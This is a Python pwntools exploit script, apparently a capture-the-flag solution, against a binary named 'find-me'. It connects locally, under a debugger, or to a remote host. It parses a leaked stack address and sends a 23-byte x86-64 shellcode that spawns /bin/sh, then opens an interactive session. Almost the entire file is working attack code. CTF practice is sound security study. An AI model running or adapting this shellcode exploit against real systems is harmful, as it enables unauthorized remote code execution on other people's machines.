from pwn import *
import re

PROGRAM_PATH = (Path(__file__).parent / "find-me").resolve().__str__()
BUFF_SIZE = 0x40
# BUFF_SIZE = 0x88
# CANARY = 123456789
# This shell code is 23 bytes
SMALL_SHELL_CODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

gdb_script = """
b *main
b *main+766
b *main+776
c
"""


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


# TODO: Add the ip address here later!
def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvuntil(delims="new stack")
print("____________________________________")
print(res)

print("____________________________________")
# Get the stack address
res = io.recvline()
res = io.recvlinesS(1)
print(res)
match = re.search(r"0x[0-9a-fA-F]+", res[0])
stck_addr = match.group(0)
print(f"stack address received: {stck_addr}")


# le = p64(int(CANARY, 16), "little")
# be = p64(int(CANARY, 16), endianness="big")
payload = SMALL_SHELL_CODE
# print(f"Sending payload: {payload}")

# io.sendline(payload)
print("____________________________________")
print(f"Sending small shellcode")
io.sendline(payload)
res = io.recvlines(1)
print(res)
io.interactive()
